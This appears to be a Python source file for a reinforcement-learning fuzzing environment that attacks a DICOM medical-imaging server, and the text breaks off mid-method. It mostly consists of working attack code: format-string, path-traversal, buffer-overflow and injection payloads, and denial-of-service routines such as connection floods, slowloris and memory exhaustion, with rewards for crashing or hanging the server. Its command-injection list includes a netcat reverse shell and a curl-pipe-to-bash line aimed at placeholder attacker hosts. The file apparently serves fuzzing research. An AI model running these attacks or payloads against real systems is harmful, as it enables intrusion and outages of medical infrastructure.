#!/usr/bin/env python3
"""
Aggressive Combined Fuzzer Environment.

Combines multiple attack strategies to maximize crash/malfunction potential:
  1. Exploit payload injection (format strings, path traversal, buffer overflow)
  2. State machine confusion (out-of-order PDUs)
  3. Length field corruption (buffer overflows)
  4. Resource exhaustion (concurrent connections)
  5. Protocol violations (invalid types, oversized fields)

This environment aims to trigger:
  - MMT-security rule alerts
  - Server crashes or malfunctions
  - Memory corruption
  - DoS conditions
"""

import os
import sys
import random
import struct
import socket
import time
import logging
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

import numpy as np

try:
    import gymnasium as gym
    from gymnasium import spaces
except ImportError:
    import gym
    from gym import spaces

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))
from fuzzer.common.pcap_utils import wrap_tcp_ip

from fuzzer.rl.server_monitor import ServerMonitor

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ============================================================================
# Exploit Payloads
# ============================================================================

# CVE-2024-23914: Format string payloads
FORMAT_STRING_PAYLOADS = [
    b'%s%s%s%s%s',
    b'%x%x%x%x',
    b'%n%n%n%n',
    b'%08x.%08x.%08x',
    b'AAAA%08x%08x%08x%08x%n',
    b'%s%s%s%s%s%s%s%s%s%s',
    b'%.1024d',
    b'%.2048d',
    b'%99999999s',
    b'%p%p%p%p%p',
]

# CVE-2022-2119/2120: Path traversal payloads (expanded)
PATH_TRAVERSAL_PAYLOADS = [
    b'../../../etc/passwd',
    b'..\\..\\..\\..\\windows\\system32',
    b'1.2.840.10008/../../../tmp/pwned',
    b'../../../../tmp/test',
    b'....//....//....//etc/passwd',
    b'..%2f..%2f..%2fetc%2fpasswd',
    b'/etc/passwd',
    b'1.2.840.10008.5.1.4.1.1.2/../../../../tmp/exfil',
    # More aggressive variants
    b'../' * 50 + b'etc/passwd',  # Very deep traversal
    b'..\\' * 50 + b'windows\\system32',
    b'\x00../../../etc/passwd',  # Null prefix
    b'../../../etc/passwd\x00.dcm',  # Null terminator
    b'file:///etc/passwd',  # File URI
    b'\\\\127.0.0.1\\c$\\windows\\system32',  # UNC path
    b'${PATH}/../../../etc/passwd',  # Variable expansion
    b'`cat /etc/passwd`',  # Command injection attempt
    b'$(cat /etc/passwd)',  # Command substitution
    b'; cat /etc/passwd',  # Command chaining
    b'| cat /etc/passwd',  # Pipe injection
]

# CVE-2015-8979: Buffer overflow payloads (oversized AE titles) - expanded
BUFFER_OVERFLOW_PAYLOADS = [
    b'A' * 17,   # Just over 16-byte limit
    b'A' * 32,
    b'A' * 64,
    b'A' * 128,
    b'A' * 256,
    b'A' * 512,
    b'A' * 1024,
    b'A' * 2048,
    b'A' * 4096,
    b'A' * 8192,
    b'\x00' * 256,  # Null bytes
    b'\xff' * 256,  # Max bytes
    b'\x00' * 1024,
    b'\xff' * 1024,
    # Pattern-based for detecting overwrites
    b''.join([bytes([i % 256]) for i in range(1024)]),  # Sequential pattern
    b'AAAA' + b'\x41\x41\x41\x41' * 256,  # Classic BOF pattern
    b'%08x.' * 128,  # Format string + overflow combo
]

# Memory corruption patterns
MEMORY_CORRUPTION_PAYLOADS = [
    struct.pack('<I', 0x41414141) * 64,  # Return address pattern
    struct.pack('<I', 0xdeadbeef) * 64,  # Common debug marker
    struct.pack('<I', 0x7fffffff) * 64,  # Max signed int
    struct.pack('<I', 0x80000000) * 64,  # Min signed int
    struct.pack('<Q', 0x4141414141414141) * 32,  # 64-bit pattern
    b'\xcc' * 256,  # INT3 (debug breakpoint)
    b'\x90' * 200 + b'\xcc' * 56,  # NOP sled + breakpoint
]

# Special characters for injection
INJECTION_PAYLOADS = [
    b'\x00\x00\x00\x00',  # Null terminators
    b'\xff\xff\xff\xff',  # Max values
    b'\x7f\x7f\x7f\x7f',  # Signed max
    b'\x80\x80\x80\x80',  # Signed overflow
    b"'; DROP TABLE--",  # SQL injection
    b'<script>alert(1)</script>',  # XSS
    b'${7*7}',  # Template injection
    b'{{7*7}}',  # SSTI
]

# ============================================================================
# PDU Builders with Exploit Injection
# ============================================================================

def build_exploit_assoc_rq(called_ae=b"ORTHANC", calling_ae=b"FUZZER",
                           app_context=None, inject_payload=None):
    """Build ASSOC_RQ with optional exploit payload injection."""

    # Pad or inject into AE titles
    if inject_payload and len(inject_payload) <= 256:
        # Inject into calling AE (buffer overflow target)
        calling = inject_payload[:64].ljust(16, b'\x00')[:16]
    else:
        calling = calling_ae.ljust(16)[:16] if isinstance(calling_ae, bytes) else calling_ae.encode().ljust(16)[:16]

    called = called_ae.ljust(16)[:16] if isinstance(called_ae, bytes) else called_ae.encode().ljust(16)[:16]

    # Application Context - can inject format strings here
    if app_context:
        app_ctx_uid = app_context
    else:
        app_ctx_uid = b'1.2.840.10008.3.1.1.1'

    app_ctx = struct.pack('>BBH', 0x10, 0, len(app_ctx_uid)) + app_ctx_uid

    # Presentation Context
    abstract_uid = b'1.2.840.10008.1.1'
    abstract = struct.pack('>BBH', 0x30, 0, len(abstract_uid)) + abstract_uid
    transfer_uid = b'1.2.840.10008.1.2'
    transfer = struct.pack('>BBH', 0x40, 0, len(transfer_uid)) + transfer_uid
    pres_ctx_data = struct.pack('>BBBB', 1, 0, 0, 0) + abstract + transfer
    pres_ctx = struct.pack('>BBH', 0x20, 0, len(pres_ctx_data)) + pres_ctx_data

    # User Info
    max_pdu = struct.pack('>BBH', 0x51, 0, 4) + struct.pack('>I', 16382)
    impl_uid = b'1.2.826.0.1.3680043.9.3811.2.0.2'
    impl_item = struct.pack('>BBH', 0x52, 0, len(impl_uid)) + impl_uid
    user_info = struct.pack('>BBH', 0x50, 0, len(max_pdu) + len(impl_item)) + max_pdu + impl_item

    variable = app_ctx + pres_ctx + user_info
    reserved32 = b'\x00' * 32
    pdu_data = struct.pack('>H', 1) + b'\x00\x00' + called + calling + reserved32 + variable

    return struct.pack('>BBi', 0x01, 0, len(pdu_data)) + pdu_data


def build_exploit_pdata(sop_class_uid=None, inject_payload=None, corrupt_length=False):
    """Build PDATA PDU with optional exploit payload injection."""

    # SOP Class UID - can inject path traversal here
    if sop_class_uid:
        uid = sop_class_uid
    else:
        uid = b'1.2.840.10008.1.1'

    if len(uid) % 2:
        uid += b'\x00'

    # DIMSE command set
    elem_0002 = struct.pack('<HH I', 0x0000, 0x0002, len(uid)) + uid
    elem_0100 = struct.pack('<HH I H', 0x0000, 0x0100, 2, 0x0030)  # C-ECHO-RQ
    elem_0110 = struct.pack('<HH I H', 0x0000, 0x0110, 2, 1)
    elem_0800 = struct.pack('<HH I H', 0x0000, 0x0800, 2, 0x0101)

    command_set = elem_0002 + elem_0100 + elem_0110 + elem_0800

    # Inject payload into command set if specified
    if inject_payload:
        # Add as a private element
        elem_private = struct.pack('<HH I', 0x0099, 0x0001, len(inject_payload)) + inject_payload
        command_set += elem_private

    elem_0000 = struct.pack('<HH I I', 0x0000, 0x0000, 4, len(command_set))
    command_set = elem_0000 + command_set

    pdv_data = struct.pack('>BB', 1, 0x03) + command_set
    pdv_item = struct.pack('>I', len(pdv_data)) + pdv_data

    pdata = struct.pack('>BBi', 0x04, 0, len(pdv_item)) + pdv_item

    # Corrupt length field if requested
    if corrupt_length:
        pdata = bytearray(pdata)
        # Set PDU length to huge value
        pdata[2:6] = struct.pack('>I', 0x7FFFFFFF)
        pdata = bytes(pdata)

    return pdata


def build_oversized_pdu(size=65536):
    """Build an oversized PDU to trigger buffer overflows."""
    payload = b'A' * size
    return struct.pack('>BBi', 0x01, 0, len(payload)) + payload


def build_malformed_pdu(pdu_type, length_value=None):
    """Build a malformed PDU with specified type and length."""
    if length_value is None:
        length_value = random.choice([0, 1, 0x7FFFFFFF, 0xFFFFFFFF, -1 & 0xFFFFFFFF])

    # Create minimal payload
    payload = b'\x00' * 10
    return struct.pack('>BBi', pdu_type, 0, length_value) + payload


# ============================================================================
# Attack Strategies
# ============================================================================

ATTACK_STRATEGIES = [
    # (name, description, attack_function)
    ("format_string_app_ctx", "Format string in Application Context"),
    ("format_string_ae", "Format string in AE Title"),
    ("path_traversal_sop", "Path traversal in SOP Class UID"),
    ("buffer_overflow_ae", "Buffer overflow via oversized AE Title"),
    ("length_overflow_pdu", "PDU length field overflow"),
    ("length_zero_pdu", "PDU length field zero"),
    ("state_pdata_first", "PDATA before association"),
    ("state_double_assoc", "Double association request"),
    ("state_abort_continue", "Abort then continue"),
    ("invalid_pdu_type", "Invalid PDU type byte"),
    ("oversized_pdu", "Extremely large PDU"),
    ("null_injection", "Null byte injection"),
    ("concurrent_flood", "Concurrent connection flood"),
    ("fragment_confusion", "Fragmented PDU confusion"),
    ("rapid_reconnect", "Rapid connect/disconnect"),
    # New aggressive strategies
    ("memory_exhaustion", "Memory exhaustion via many large PDUs"),
    ("slowloris", "Slowloris-style slow send attack"),
    ("length_mismatch", "PDU length vs actual data mismatch"),
    ("nested_overflow", "Overflow in nested DICOM items"),
    ("command_injection", "Command injection in string fields"),
]


# ============================================================================
# Aggressive Fuzzing Environment
# ============================================================================

class AggressiveFuzzEnv(gym.Env):
    """
    Combined aggressive fuzzing environment.

    Action space: Select attack strategy + intensity level
    Observation: Attack results + server state
    """

    metadata = {"render_modes": ["human"]}

    def __init__(self, target_host=None, target_port=4242, called_ae="ORTHANC",
                 max_steps=20, n_concurrent=5):
        super().__init__()

        self.target_host = target_host
        self.target_port = target_port
        self.called_ae = called_ae.encode() if isinstance(called_ae, str) else called_ae
        self.max_steps = max_steps
        self.n_concurrent = n_concurrent

        # Action: strategy index * intensity (3 levels)
        self.n_strategies = len(ATTACK_STRATEGIES)
        self.n_intensities = 3  # low, medium, high
        self.action_space = spaces.Discrete(self.n_strategies * self.n_intensities)

        # Observation: [strategy_one_hot, intensity, response_counts, health_metrics]
        obs_size = self.n_strategies + 1 + 10 + 5  # strategies + intensity + responses + health
        self.observation_space = spaces.Box(
            low=0, high=255,
            shape=(obs_size,),
            dtype=np.float32,
        )

        # Server monitor
        self.server_monitor = None
        if target_host:
            self.server_monitor = ServerMonitor(
                target_host=target_host,
                target_port=target_port,
                called_ae=called_ae if isinstance(called_ae, str) else called_ae.decode(),
            )

        # State tracking
        self.step_count = 0
        self.episode_reward = 0
        self.last_strategy = 0
        self.last_intensity = 0
        self.response_counts = {}
        self.crashes_detected = 0
        self.hangs_detected = 0
        self.alerts_triggered = 0
        self.baseline_health = None

    def _execute_attack(self, strategy_name, intensity):
        """Execute an attack strategy and return results."""
        info = {
            "strategy": strategy_name,
            "intensity": intensity,
            "response": "none",
            "crash": False,
            "hang": False,
            "alert": False,
            "response_time_ms": 0,
            "error": None,
        }
        reward = 0.0

        if not self.target_host:
            return reward, info

        try:
            if strategy_name == "format_string_app_ctx":
                reward, info = self._attack_format_string_app_ctx(intensity, info)
            elif strategy_name == "format_string_ae":
                reward, info = self._attack_format_string_ae(intensity, info)
            elif strategy_name == "path_traversal_sop":
                reward, info = self._attack_path_traversal(intensity, info)
            elif strategy_name == "buffer_overflow_ae":
                reward, info = self._attack_buffer_overflow(intensity, info)
            elif strategy_name == "length_overflow_pdu":
                reward, info = self._attack_length_overflow(intensity, info)
            elif strategy_name == "length_zero_pdu":
                reward, info = self._attack_length_zero(intensity, info)
            elif strategy_name == "state_pdata_first":
                reward, info = self._attack_pdata_first(intensity, info)
            elif strategy_name == "state_double_assoc":
                reward, info = self._attack_double_assoc(intensity, info)
            elif strategy_name == "state_abort_continue":
                reward, info = self._attack_abort_continue(intensity, info)
            elif strategy_name == "invalid_pdu_type":
                reward, info = self._attack_invalid_pdu_type(intensity, info)
            elif strategy_name == "oversized_pdu":
                reward, info = self._attack_oversized_pdu(intensity, info)
            elif strategy_name == "null_injection":
                reward, info = self._attack_null_injection(intensity, info)
            elif strategy_name == "concurrent_flood":
                reward, info = self._attack_concurrent_flood(intensity, info)
            elif strategy_name == "fragment_confusion":
                reward, info = self._attack_fragment_confusion(intensity, info)
            elif strategy_name == "rapid_reconnect":
                reward, info = self._attack_rapid_reconnect(intensity, info)
            elif strategy_name == "memory_exhaustion":
                reward, info = self._attack_memory_exhaustion(intensity, info)
            elif strategy_name == "slowloris":
                reward, info = self._attack_slowloris(intensity, info)
            elif strategy_name == "length_mismatch":
                reward, info = self._attack_length_mismatch(intensity, info)
            elif strategy_name == "nested_overflow":
                reward, info = self._attack_nested_overflow(intensity, info)
            elif strategy_name == "command_injection":
                reward, info = self._attack_command_injection(intensity, info)
            else:
                info["error"] = f"Unknown strategy: {strategy_name}"

        except Exception as e:
            info["error"] = str(e)
            info["response"] = "exception"
            reward = 5.0  # Exceptions might indicate issues

        return reward, info

    def _send_and_receive(self, pdu_bytes, timeout=2.0):
        """Send PDU and receive response with timing."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.settimeout(timeout)

        try:
            t_start = time.monotonic()
            sock.connect((self.target_host, self.target_port))
            sock.sendall(pdu_bytes)

            try:
                response = sock.recv(4096)
                t_end = time.monotonic()
                return response, (t_end - t_start) * 1000, None
            except socket.timeout:
                return None, timeout * 1000, "timeout"
        except ConnectionResetError:
            return None, 0, "reset"
        except ConnectionRefusedError:
            return None, 0, "refused"
        except Exception as e:
            return None, 0, str(e)
        finally:
            try:
                sock.close()
            except:
                pass

    def _check_server_alive(self):
        """Quick check if server is still responding."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2.0)
            sock.connect((self.target_host, self.target_port))
            sock.close()
            return True
        except:
            return False

    # ========== Attack Implementations ==========

    def _attack_format_string_app_ctx(self, intensity, info):
        """Inject format string into Application Context."""
        payloads = FORMAT_STRING_PAYLOADS[:intensity * 3 + 3]
        reward = 0.0

        for payload in payloads:
            pdu = build_exploit_assoc_rq(
                called_ae=self.called_ae,
                app_context=payload
            )
            response, time_ms, error = self._send_and_receive(pdu)
            info["response_time_ms"] = time_ms

            if error == "timeout":
                info["hang"] = True
                self.hangs_detected += 1
                reward += 50.0
            elif error == "refused":
                if not self._check_server_alive():
                    info["crash"] = True
                    self.crashes_detected += 1
                    reward += 100.0
            elif response:
                if response[0] == 0x07:  # Abort
                    info["response"] = "abort"
                    reward += 15.0
                elif response[0] == 0x02:  # Accept with payload!
                    info["response"] = "accept_payload"
                    reward += 30.0  # Very interesting

        return reward, info

    def _attack_format_string_ae(self, intensity, info):
        """Inject format string into AE Title."""
        payloads = FORMAT_STRING_PAYLOADS[:intensity * 3 + 3]
        reward = 0.0

        for payload in payloads:
            pdu = build_exploit_assoc_rq(
                called_ae=self.called_ae,
                inject_payload=payload
            )
            response, time_ms, error = self._send_and_receive(pdu)
            info["response_time_ms"] = time_ms

            if error == "timeout":
                info["hang"] = True
                reward += 50.0
            elif error:
                reward += 5.0
            elif response and response[0] != 0x03:  # Not normal reject
                reward += 20.0

        return reward, info

    def _attack_path_traversal(self, intensity, info):
        """Inject path traversal into SOP Class UID."""
        payloads = PATH_TRAVERSAL_PAYLOADS[:intensity * 3 + 3]
        reward = 0.0

        # First establish valid association
        assoc_rq = build_exploit_assoc_rq(called_ae=self.called_ae)

        for payload in payloads:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3.0)
                sock.connect((self.target_host, self.target_port))

                # Send association
                sock.sendall(assoc_rq)
                assoc_resp = sock.recv(4096)

                if assoc_resp and assoc_resp[0] == 0x02:  # Accepted
                    # Send PDATA with path traversal
                    pdata = build_exploit_pdata(sop_class_uid=payload)
                    t_start = time.monotonic()
                    sock.sendall(pdata)

                    try:
                        data_resp = sock.recv(4096)
                        t_end = time.monotonic()
                        info["response_time_ms"] = (t_end - t_start) * 1000

                        if data_resp and data_resp[0] == 0x04:
                            info["response"] = "pdata_processed"
                            reward += 25.0  # Server processed our malicious UID
                        elif data_resp and data_resp[0] == 0x07:
                            info["response"] = "abort"
                            reward += 10.0
                    except socket.timeout:
                        info["hang"] = True
                        reward += 50.0

                sock.close()
            except Exception as e:
                info["error"] = str(e)

        return reward, info

    def _attack_buffer_overflow(self, intensity, info):
        """Send oversized AE titles for buffer overflow."""
        sizes = [17, 32, 64, 128, 256, 512, 1024][:intensity * 2 + 2]
        reward = 0.0

        for size in sizes:
            payload = b'A' * size
            pdu = build_exploit_assoc_rq(
                called_ae=self.called_ae,
                inject_payload=payload
            )
            response, time_ms, error = self._send_and_receive(pdu)

            if error == "refused" and not self._check_server_alive():
                info["crash"] = True
                reward += 100.0
                break
            elif error == "timeout":
                info["hang"] = True
                reward += 50.0
            elif error == "reset":
                reward += 3.0

        return reward, info

    def _attack_length_overflow(self, intensity, info):
        """Corrupt PDU length field with large values."""
        values = [0x7FFFFFFF, 0xFFFFFFFF, 0x80000000, 0x10000000]
        reward = 0.0

        for val in values[:intensity + 1]:
            pdu = build_malformed_pdu(0x01, val)
            response, time_ms, error = self._send_and_receive(pdu, timeout=1.5)

            if error == "refused" and not self._check_server_alive():
                info["crash"] = True
                reward += 100.0
            elif error == "timeout":
                info["hang"] = True
                reward += 40.0
            elif error == "reset":
                reward += 2.0

        return reward, info

    def _attack_length_zero(self, intensity, info):
        """Send PDU with zero length."""
        pdu = build_malformed_pdu(0x01, 0)
        response, time_ms, error = self._send_and_receive(pdu)

        if error == "timeout":
            info["hang"] = True
            return 40.0, info
        elif error == "refused":
            if not self._check_server_alive():
                info["crash"] = True
                return 100.0, info
        return 2.0, info

    def _attack_pdata_first(self, intensity, info):
        """Send PDATA before association."""
        pdata = build_exploit_pdata()
        response, time_ms, error = self._send_and_receive(pdata)

        if error == "timeout":
            info["hang"] = True
            return 50.0, info
        elif response and response[0] == 0x07:
            info["response"] = "abort"
            return 15.0, info
        return 5.0, info

    def _attack_double_assoc(self, intensity, info):
        """Send double association request."""
        assoc_rq = build_exploit_assoc_rq(called_ae=self.called_ae)
        reward = 0.0

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3.0)
            sock.connect((self.target_host, self.target_port))

            # First association
            sock.sendall(assoc_rq)
            resp1 = sock.recv(4096)

            if resp1 and resp1[0] == 0x02:  # Accepted
                # Send another association (protocol violation)
                sock.sendall(assoc_rq)
                try:
                    resp2 = sock.recv(4096)
                    if resp2 and resp2[0] == 0x02:
                        info["response"] = "double_accept"
                        reward = 30.0  # Server accepted double association!
                    elif resp2 and resp2[0] == 0x07:
                        info["response"] = "abort"
                        reward = 10.0
                except socket.timeout:
                    info["hang"] = True
                    reward = 50.0

            sock.close()
        except Exception as e:
            info["error"] = str(e)

        return reward, info

    def _attack_abort_continue(self, intensity, info):
        """Send abort then try to continue."""
        assoc_rq = build_exploit_assoc_rq(called_ae=self.called_ae)
        abort_pdu = struct.pack('>BBi BB BB', 0x07, 0, 4, 0, 0, 0, 0)
        pdata = build_exploit_pdata()
        reward = 0.0

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3.0)
            sock.connect((self.target_host, self.target_port))

            sock.sendall(assoc_rq)
            sock.recv(4096)
            sock.sendall(abort_pdu)
            time.sleep(0.1)

            # Try to send data after abort
            sock.sendall(pdata)
            try:
                resp = sock.recv(4096)
                if resp:
                    info["response"] = f"post_abort_0x{resp[0]:02x}"
                    reward = 20.0  # Server responded after abort
            except socket.timeout:
                info["hang"] = True
                reward = 40.0

            sock.close()
        except Exception as e:
            pass

        return reward, info

    def _attack_invalid_pdu_type(self, intensity, info):
        """Send PDU with invalid type byte."""
        invalid_types = [0x00, 0x08, 0x09, 0x0A, 0x0F, 0x10, 0x80, 0xFF]
        reward = 0.0

        for pdu_type in invalid_types[:intensity * 2 + 2]:
            pdu = build_malformed_pdu(pdu_type)
            response, time_ms, error = self._send_and_receive(pdu)

            if error == "timeout":
                info["hang"] = True
                reward += 30.0
            elif response:
                info["response"] = f"type_{pdu_type:02x}_resp"
                reward += 10.0

        return reward, info

    def _attack_oversized_pdu(self, intensity, info):
        """Send extremely large PDU - proven effective for hanging servers."""
        # Increase sizes based on success
        sizes = [65536, 131072, 262144, 524288, 1048576]  # Up to 1MB
        size = sizes[min(intensity, len(sizes) - 1)]
        reward = 0.0

        # Try multiple large PDUs in sequence
        for _ in range(intensity + 1):
            pdu = build_oversized_pdu(size)
            response, time_ms, error = self._send_and_receive(pdu, timeout=8.0)

            if error == "timeout":
                info["hang"] = True
                reward += 60.0
            elif error == "refused":
                if not self._check_server_alive():
                    info["crash"] = True
                    reward += 100.0
                    break
            else:
                reward += 5.0

        # Memory check - server might be degraded
        time.sleep(0.5)
        if not self._check_server_alive():
            info["crash"] = True
            reward += 100.0

        return reward, info

    def _attack_null_injection(self, intensity, info):
        """Inject null bytes at critical positions."""
        assoc_rq = bytearray(build_exploit_assoc_rq(called_ae=self.called_ae))
        reward = 0.0

        # Inject nulls at different positions
        positions = [0, 1, 2, 6, 10, 26, 74]
        for pos in positions[:intensity * 2 + 2]:
            if pos < len(assoc_rq):
                assoc_rq[pos] = 0x00

        response, time_ms, error = self._send_and_receive(bytes(assoc_rq))

        if error == "timeout":
            info["hang"] = True
            return 40.0, info
        return 3.0, info

    def _attack_concurrent_flood(self, intensity, info):
        """Flood server with concurrent connections."""
        n_connections = (intensity + 1) * 5
        results = []

        def connect_and_send():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2.0)
                sock.connect((self.target_host, self.target_port))
                pdu = build_exploit_assoc_rq(called_ae=self.called_ae)
                sock.sendall(pdu)
                resp = sock.recv(4096)
                sock.close()
                return "ok" if resp else "empty"
            except socket.timeout:
                return "timeout"
            except ConnectionRefusedError:
                return "refused"
            except Exception as e:
                return "error"

        with ThreadPoolExecutor(max_workers=n_connections) as executor:
            futures = [executor.submit(connect_and_send) for _ in range(n_connections)]
            for f in as_completed(futures, timeout=10):
                try:
                    results.append(f.result())
                except:
                    results.append("exception")

        refused_count = results.count("refused")
        timeout_count = results.count("timeout")

        reward = 0.0
        if refused_count > n_connections * 0.5:
            info["response"] = "connection_exhausted"
            reward = 40.0
        if timeout_count > n_connections * 0.3:
            info["hang"] = True
            reward += 30.0

        # Check if server is still alive
        if not self._check_server_alive():
            info["crash"] = True
            reward = 100.0

        return reward, info

    def _attack_fragment_confusion(self, intensity, info):
        """Send fragmented/partial PDUs."""
        assoc_rq = build_exploit_assoc_rq(called_ae=self.called_ae)
        reward = 0.0

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3.0)
            sock.connect((self.target_host, self.target_port))

            # Send first half
            mid = len(assoc_rq) // 2
            sock.sendall(assoc_rq[:mid])
            time.sleep(0.5)  # Delay between fragments

            # Send second half
            sock.sendall(assoc_rq[mid:])

            try:
                resp = sock.recv(4096)
                if resp:
                    info["response"] = f"fragment_0x{resp[0]:02x}"
                    reward = 10.0
            except socket.timeout:
                info["hang"] = True
                reward = 30.0

            sock.close()
        except Exception as e:
            pass

        return reward, info

    def _attack_rapid_reconnect(self, intensity, info):
        """Rapid connect/disconnect cycles."""
        n_cycles = (intensity + 1) * 10
        reward = 0.0

        for _ in range(n_cycles):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((self.target_host, self.target_port))
                sock.close()
            except:
                pass

        # Check server health after rapid cycles
        if not self._check_server_alive():
            info["crash"] = True
            reward = 100.0
        else:
            reward = 5.0

        return reward, info

    def _attack_memory_exhaustion(self, intensity, info):
        """Send many large PDUs to exhaust server memory."""
        n_pdus = (intensity + 1) * 3
        pdu_size = 65536 * (intensity + 1)  # 64KB, 128KB, 192KB
        reward = 0.0

        for i in range(n_pdus):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5.0)
                sock.connect((self.target_host, self.target_port))

                # Send large association request
                large_payload = b'A' * pdu_size
                # Claim it's an ASSOC_RQ with huge length
                pdu = struct.pack('>BBi', 0x01, 0, pdu_size) + large_payload

                sock.sendall(pdu)

                try:
                    resp = sock.recv(4096)
                except socket.timeout:
                    info["hang"] = True
                    reward += 40.0

                sock.close()
            except ConnectionRefusedError:
                if not self._check_server_alive():
                    info["crash"] = True
                    reward += 100.0
                    break
            except Exception as e:
                pass

            # Brief pause to let server process
            time.sleep(0.1)

        # Check if server is degraded
        if not self._check_server_alive():
            info["crash"] = True
            reward += 100.0

        return reward, info

    def _attack_slowloris(self, intensity, info):
        """Slowloris-style attack: send data very slowly to exhaust connections."""
        n_connections = (intensity + 1) * 3
        sockets = []
        reward = 0.0

        assoc_rq = build_exploit_assoc_rq(called_ae=self.called_ae)

        # Open multiple connections and send data slowly
        for i in range(n_connections):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10.0)
                sock.connect((self.target_host, self.target_port))
                sockets.append(sock)
            except:
                pass

        # Send data byte by byte with delays
        for byte_idx in range(min(50, len(assoc_rq))):
            for sock in sockets:
                try:
                    sock.send(assoc_rq[byte_idx:byte_idx+1])
                except:
                    pass
            time.sleep(0.1)  # Slow send

        # Check if we've exhausted connections
        test_sock = None
        try:
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_sock.settimeout(2.0)
            test_sock.connect((self.target_host, self.target_port))
            test_sock.close()
            reward = 10.0
        except socket.timeout:
            info["hang"] = True
            reward = 50.0
        except ConnectionRefusedError:
            info["response"] = "connection_exhausted"
            reward = 40.0
        except:
            pass

        # Cleanup
        for sock in sockets:
            try:
                sock.close()
            except:
                pass

        return reward, info

    def _attack_length_mismatch(self, intensity, info):
        """Send PDU where length field doesn't match actual data."""
        reward = 0.0

        mismatches = [
            (100, 50),    # Claimed 100 bytes, send 50
            (50, 100),    # Claimed 50 bytes, send 100
            (65535, 10),  # Claimed huge, send tiny
            (10, 65535),  # Claimed tiny, send huge
            (0, 100),     # Claimed 0, send data
        ]

        for claimed_len, actual_len in mismatches[:intensity + 2]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3.0)
                sock.connect((self.target_host, self.target_port))

                # Build PDU with mismatched length
                pdu = struct.pack('>BBi', 0x01, 0, claimed_len) + (b'A' * actual_len)
                sock.sendall(pdu)

                try:
                    resp = sock.recv(4096)
                    if resp:
                        info["response"] = f"mismatch_{claimed_len}_{actual_len}"
                        reward += 10.0
                except socket.timeout:
                    info["hang"] = True
                    reward += 30.0

                sock.close()
            except ConnectionResetError:
                reward += 5.0
            except Exception as e:
                pass

        if not self._check_server_alive():
            info["crash"] = True
            reward += 100.0

        return reward, info

    def _attack_nested_overflow(self, intensity, info):
        """Overflow in nested DICOM variable items (Presentation Context, User Info)."""
        reward = 0.0

        # Build ASSOC_RQ with malformed nested items
        called = self.called_ae.ljust(16)[:16] if isinstance(self.called_ae, bytes) else self.called_ae.encode().ljust(16)[:16]
        calling = b'FUZZER'.ljust(16)

        # Malformed Application Context with huge claimed length
        app_ctx_uid = b'1.2.840.10008.3.1.1.1'
        overflow_sizes = [0xFFFF, 0x7FFF, 65535, 32768]

        for overflow_len in overflow_sizes[:intensity + 1]:
            # Item claims huge length but has small data
            app_ctx = struct.pack('>BBH', 0x10, 0, overflow_len) + app_ctx_uid

            # Or: Item has huge actual data
            huge_uid = b'1.2.3.' + (b'9' * min(overflow_len, 10000))
            app_ctx_huge = struct.pack('>BBH', 0x10, 0, len(huge_uid)) + huge_uid

            for app_ctx_variant in [app_ctx, app_ctx_huge]:
                try:
                    # Minimal valid structure around malformed item
                    pres_ctx = struct.pack('>BBH', 0x20, 0, 4) + b'\x01\x00\x00\x00'
                    user_info = struct.pack('>BBH', 0x50, 0, 8) + struct.pack('>BBH I', 0x51, 0, 4, 16382)

                    variable = app_ctx_variant + pres_ctx + user_info
                    reserved32 = b'\x00' * 32
                    pdu_data = struct.pack('>H', 1) + b'\x00\x00' + called + calling + reserved32 + variable
                    pdu = struct.pack('>BBi', 0x01, 0, len(pdu_data)) + pdu_data

                    response, time_ms, error = self._send_and_receive(pdu)

                    if error == "timeout":
                        info["hang"] = True
                        reward += 40.0
                    elif error == "refused" and not self._check_server_alive():
                        info["crash"] = True
                        reward += 100.0
                    elif response:
                        reward += 5.0

                except Exception as e:
                    pass

        return reward, info

    def _attack_command_injection(self, intensity, info):
        """Attempt command injection in various string fields."""
        reward = 0.0

        injection_payloads = [
            b'`id`',
            b'$(whoami)',
            b'; cat /etc/passwd',
            b'| nc attacker 4444 -e /bin/sh',
            b'&& curl http://evil.com/shell.sh | bash',
            b'\'; DROP TABLE patients; --',
            b'${IFS}cat${IFS}/etc/passwd',
            b'${{7*7}}',
            b'{{config}}',
            b'<%= system("id") %>',
        ]

        # Try injection in various fields
        for payload in injection_payloads[:intensity * 3 + 3]:
            # In AE title
            pdu = build_exploit_assoc_rq(
                called_ae=self.called_ae,
                inject_payload=payload
            )
            response, time_ms, error = self._send_and_receive(pdu)

            if error == "timeout":
                info["hang"] = True
                reward += 30.0
            elif error == "refused" and not self._check_server_alive():
                info["crash"] = True
                reward += 100.0

            # In Application Context
            pdu = build_exploit_assoc_rq(
                called_ae=self.called_ae,
                app_context=payload
            )
            response, time_ms, error = self._send_and_receive(pdu)

            if error == "timeout":
                info["hang"] = True
                reward += 30.0

        return reward, info

    # ========== Gym Interface ==========

    def _get_obs(self):
        """Build observation vector."""
        obs = np.zeros(self.observation_space.shape[0], dtype=np.float32)

        # Strategy one-hot
        obs[self.last_strategy] = 1.0

        # Intensity
        obs[self.n_strategies] = self.last_intensity / self.n_intensities

        # Response counts (normalized)
        resp_idx = self.n_strategies + 1
        for i, resp in enumerate(["reset", "abort", "accept", "timeout", "crash",
                                   "refused", "hang", "error", "unknown", "ok"]):
            if i < 10:
